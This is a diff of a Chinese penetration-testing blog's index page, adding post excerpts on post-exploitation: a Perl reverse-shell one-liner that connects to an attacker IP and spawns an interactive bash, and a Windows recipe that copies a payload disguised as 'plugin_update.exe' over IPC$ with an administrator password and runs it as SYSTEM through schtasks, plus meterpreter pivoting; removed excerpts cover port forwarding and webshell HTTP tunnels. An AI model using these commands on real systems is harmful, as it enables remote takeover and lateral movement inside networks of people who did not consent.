@@ -139,6 +139,135 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/09/27/revese-shell/">
+                很多时候你需要的也许只是一个shell
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-27</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/shell/">shell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,在实际渗透过程中想进行某些操作,我们迫切的需要一个可交互的shell,但你又不想上传工具到目标机器上,怎么办呢,希望下面的内容能对你有用,”利用目标机器上现有的环境弹回一个可交互的shell”(没错,coablt strike &amp; msf 会更方便,但今天只单纯的说reverse shell):<br><br></p>
+<h5 id="首先-可以先尝试利用linux系统现有的各种环境来弹shell"><a href="#首先-可以先尝试利用linux系统现有的各种环境来弹shell" class="headerlink" title="首先,可以先尝试利用linux系统现有的各种环境来弹shell:"></a>首先,可以先尝试利用linux系统现有的各种环境来弹shell:</h5><p>1,利用perl反弹,也是个人比较推荐的方式,因为现在几乎主流的linux发行版都已经预装了perl,你会发现很多大马里面默认也都会选择使用perl<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># perl -e 'use Socket;$i="192.168.3.251";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");&#125;;'</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/27/revese-shell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/26/install-py27-on-centos/">
+                在目标机器上快速编译安装py2.7
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-26</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/python/">python</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;有时迫于无奈,我们需要在目标机器上安装一些自己的工具环境,尤其是linux(默认2.6.6,有些脚本很难跑起来),因为win下的工具已经非常丰富了,这里就不说了<br><br><br>1,编译安装python2.7:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development tools" -y</span></div><div class="line"><span class="comment"># yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel -y</span></div><div class="line"><span class="comment"># wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># tar -xf Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># # cd Python-2.7.11</span></div><div class="line"><span class="comment"># ./configure --prefix=/usr/local</span></div><div class="line"><span class="comment"># make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># python2.7</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; import sys</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; sys.version</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/26/install-py27-on-centos/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/25/msf-socks4a/">
+                通向彼岸 之内网代理转发 [msf中的socs4a模块使用及meterpreter多级内网穿透]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/scoks4a/">scoks4a</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;如果你觉得用别的socks代理工具太麻烦,不用担心,在msf中同样也为我们提供好了用于socks代理的模块[socks4a],虽然它只是基于scoks4的,但对于我们实际渗透来讲,关系并不大<br><br><br>1,首先,假设我们已经获取了目标系统的meterpreter会话,然后,我们发现在目标机器上存在内网段,这时,我们想继续对目标内网进行渗透,然后就有了下面的一些内容<br><img src="/img/ipconfig meter.jpg" alt=""><br><br>
+        </div>
+        <a href="/2016/09/25/msf-socks4a/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/24/ipc-reverse-shell/">
+                win内网中利用ipc弹shell 小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ipc-note/">ipc note</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 先把马拷到目标机器上再说:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># net use <span class="symbol">\\</span>192.168.3.168<span class="symbol">\i</span>pc$ /user:administrator "admin!@#45"</div><div class="line"># copy shell.exe <span class="symbol">\\</span>192.168.3.168<span class="symbol">\c</span>$<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\p</span>lugin_update.exe</div></pre></td></tr></table></figure></p>
+<p>0x02 常规的copy[xcopy] &amp; schtasks(按说ipc建立以后,schtasks就不用带账号密码了,尤其我这里还是以system权限运行[本身就是不需要账号密码的],但实际测试中不带就拒绝访问,保险起见还是带上):<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># schtasks /create /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /<span class="keyword">tr</span> <span class="keyword">c</span>:\windows\temp\plugin_update.<span class="keyword">exe</span> /sc once /<span class="keyword">st</span> <span class="number">10</span>:<span class="number">29</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /RU System  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span> </div><div class="line"># schtasks /run /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span>  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span>  你也可以不用等,让目标立即运行任务</div><div class="line"># schtasks /F /<span class="keyword">delete</span> /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/24/ipc-reverse-shell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/09/23/time-tasks/">
                 win计划任务小记 [ at schtasks ]
             </a>
@@ -257,145 +386,12 @@
 
     
         <div class="content">
-            <p><br></p>
-<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;如果你觉得netsh和iptables配置稍微有点儿繁琐,有款小工具可能会适合你,fpipe 一款专门用于端口重定向的小工具,从名字就能猜出来它是干啥的,很明显,forward pipe[转发,通过管道],虽然功能上和netsh有一点点类似,但确实不是一类东西,同样是监听来自外部的某个端口,但它多做了一步,它会把来自外部端口的流量先转到本地某个指定的端口上(转发),再通过转到的这个本地端口去连远程机器的某个端口(管道),而不是像netsh只是单纯的把端口转过去,简易的通信流程如下</p>
-<p>外部端口访问 &lt;-&gt; 本地监听来自外部的这个端口并它转到本地的另一个端口上(在本地绑定两个端口) &lt;-&gt; 通过本地的另一个端口和远程机器的某个端口通信 </p>
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;如果你觉得netsh和iptables配置稍微有点儿繁琐,有款小工具可能会适合你,fpipe 一款专门用于端口重定向的小工具,从名字就能猜出来它是干啥的,很明显,forward pipe[转发,通过管道],虽然功能上和netsh有一点点类似,但确实不是一类东西,同样是监听来自外部的某个端口,但它多做了一步,它会把来自外部端口的流量先转到本地某个指定的端口上(转发),再通过转到的这个本地端口去连远程机器的某个端口(管道),而不是像netsh只是单纯的把端口转过去,简易的通信流程如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">外部端口访问 <span class="tag">&lt;<span class="name">-</span>&gt;</span> 本地监听来自外部的这个端口并它转到本地的另一个端口上(在本地绑定两个端口) <span class="tag">&lt;<span class="name">-</span>&gt;</span> 通过本地的另一个端口和远程机器的某个端口通信</div></pre></td></tr></table></figure>
 <p>工具选项如下,非常简单,看选项说明就懂了:<br><img src="/img/fpipe help.png" alt=""><br></p>
-<p>1,我们可以拿它来做什么<br>&nbsp;&nbsp;&nbsp;&nbsp;刚刚在上面已经说过,它并非直接转发,而是又自己建立了一个新的通道,这样的好处在哪里呢,很明显,我们可以通过这样的方式来轻松bypass掉各类应用层防火墙<br>
+<p>0x02 我们可以拿它来做什么<br>&nbsp;&nbsp;&nbsp;&nbsp;刚刚在上面已经说过,它并非直接转发,而是又自己建立了一个新的通道,这样的好处在哪里呢,很明显,我们可以通过这样的方式来轻松bypass掉各类应用层防火墙</p>
         </div>
         <a href="/2016/09/20/fpipe-redirect-port/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/19/iptables-portfward/">
-                通向彼岸 之内网代理转发 [ 系统篇 iptables ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/iptabbles/">iptabbles</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="作用和netsh差不多-这里就不废话了-直接看操作-还是同样的情况-只不过你此时拿下的是边界的一台linux服务器-依然想通过这台机器直接去访问内网的其它机器"><a href="#作用和netsh差不多-这里就不废话了-直接看操作-还是同样的情况-只不过你此时拿下的是边界的一台linux服务器-依然想通过这台机器直接去访问内网的其它机器" class="headerlink" title="作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器"></a>作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器</h5><p><br></p>
-<p>1,环境大致如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">边界linux机器(centos <span class="number">6.8</span>en) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.40</span>(假设为目标机器的公网ip) <span class="number">192.168</span>.<span class="number">32.129</span>(假设为目标的内网ip) </div><div class="line">要访问的内网windows机器(win <span class="number">2008</span>r2cn) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span> </div><div class="line">攻击者机器(win7cn): <span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
-<p>2,最终目的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过边界的linux机器访问内网中的windows机器上的服务</div></pre></td></tr></table></figure></p>
-<p>3,具体过程如下,首先,编辑边界linux系统的路由转发配置文件,开启其路由转发功能<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sed -i '/net.ipv4.ip_forward/ s/\(.*= \).*/\11/' /etc/sysctl.conf</span></div><div class="line"><span class="comment"># cat /etc/sysctl.conf | grep "net.ipv4.ip_forward"</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/19/iptables-portfward/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/18/netsh-portfward/">
-                通向彼岸 之内网代理转发 [ 系统篇 netsh ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/netsh/">netsh</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;除了前面提到的用一些端口转发工具来进行端口转发,其实windows系统自己也给我们提供了类似的功能,比如,其自带的防火墙管理工具’netsh’套件(确实非常实用),尤其碰到一些稍微畸形点的内网环境:<br><br></p>
-<p>1,先来假设这么一种情况<br>&nbsp;&nbsp;&nbsp;&nbsp;当你搞定边界的一台windows机器以后,上去一看发现,机器上有两块网卡,一块外网卡,一块内网卡(先以正常的DMZ来讲),这时又你通过别的方式搞定了同内网的另一台windows机器,本来以为简单的种上马就可以走人了,但你发现马执行以后似乎什么都没发生,搞了半天,你才发现,原来这台内网机器根本不能连外网,说到这里,相必你也应该知道我要干啥了,没错,虽然内网的那台机器不能连外网,但它起码能跟边界的这台机器正常通信,这就够了,我们可以直接从外部通过边界这台机器来访问内网的那台不能连外网的机器<br><br><br>2,演示简单环境如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">目标的边界机器(win7en) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.212</span>(假设为目标公网ip,这台机器没有任何服务,就是台个人机,rdp和telnet当然也不会开了) <span class="number">192.168</span>.<span class="number">32.132</span>(目标内网ip)</div><div class="line">目标内网的那台不能连外网的机器(win <span class="number">2008</span>r2cn) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span>(目标内网ip)</div><div class="line">外部的攻击者的机器(win7cn) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
-<p>3,要实现的目的很简单:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">首先,可以确认的是,边界机器和攻击者机器通信正常,边界机器和目标内网的那台不能连外网的机器通信正常</div><div class="line">现在,我想通过边界机器的某个端口去访问目标内网的那台不能上外网的机器的<span class="number">3389</span>,下面是具体的操作步骤</div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/18/netsh-portfward/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/16/http-tunnel-question/">
-                通向彼岸 之内网代理转发 [ http隧道篇 使用过程中容易出现的一些问题 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-16</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/http-tunnel/">http tunnel</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="关于使用http隧道代理脚本时-容易出现的一些错误及解决办法"><a href="#关于使用http隧道代理脚本时-容易出现的一些错误及解决办法" class="headerlink" title="关于使用http隧道代理脚本时,容易出现的一些错误及解决办法:"></a>关于使用http隧道代理脚本时,容易出现的一些错误及解决办法:</h5><p><br><br>1,如果是php程序,你可能需要先确保php.ini中的socket模块已正常开启并且可用,因为php中的socket函数要基于此模块,不过,reGeorg早已经提供了不再需要开启socket的代理脚本<br><br><br>2,有时候你在绑定某些端口会遇到socket无法建立连接的问题,不妨尝试换一下端口,比如:53,8080,443,只要不跟目标系统中的现有端口冲突即可,尽量用一些穿透性比较好的端口<br><br><br>3,有时还会遇到aspx 运行错误,看具体是什么错误,如果一眼解决不了,谷歌一下,里面肯定一大堆,比如:’Compilation Error’,可以尝试在代理脚本(webshell)的当前所在目录,另外新建一个web.conf文件,一般也即可解决,文件具体内容如下:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;configuration&gt;</div><div class="line">  &lt;system.web&gt;</div><div class="line">  &lt;customErrors mode="Off"/&gt;</div><div class="line">  &lt;/system.web&gt;</div><div class="line">&lt;/configuration&gt;</div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/16/http-tunnel-question/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/15/abptts-http-tunnel/">
-                通向彼岸 之内网代理转发 [ http隧道篇 abptts ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-15</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/http-tunnel/">http tunnel</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;abptts 一款基于简单传输加密的http隧道工具,实际测试中相对来说还算比较稳定,起码比regerog都要稳定一些,且全程通信数据加密,可一定程度上对抗取证检测,就单这一点来说,还是很赞的,不过,加不加密,它自己说的不算,还是老办法,拿wireshark耐心的走一遍,就明白了,尽量用事实说话嘛<br><br><br>1,首先,安装好工具所需的各种py依赖库:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> pip install pycrypto    加密库,整个数据加密都要靠这个</span></div><div class="line"><span class="meta">#</span><span class="bash"> pip install httplib2</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/15/abptts-http-tunnel/" class="read-more">Read More</a>
     
 
 </div>
@@ -452,7 +448,7 @@ document.getElementById("showDays").innerHTML = " 其实博客已默默坚挺了
 </script>
 <br>
 <br>
-有多年实战渗透经验积累[大中小型网络] + 娴熟的底层开发能力 + 熟练的协议分析能力 + 有多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 安全架构师
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
 <br>
 <br>
 <font size=6 color="white">唯一不变的,就是一直在变</font>
@@ -498,7 +494,7 @@ document.getElementById("showDays").innerHTML = " 其实博客已默默坚挺了
         </div>
     </div>
 		<audio autoplay="autoplay">
-		<source src="/img/Good_Goodbye.mp3" type="audio/mpeg" />
+		<source src="/img/Good Time.mp3" type="audio/mpeg" />
 		</audio>
 </footer>
 
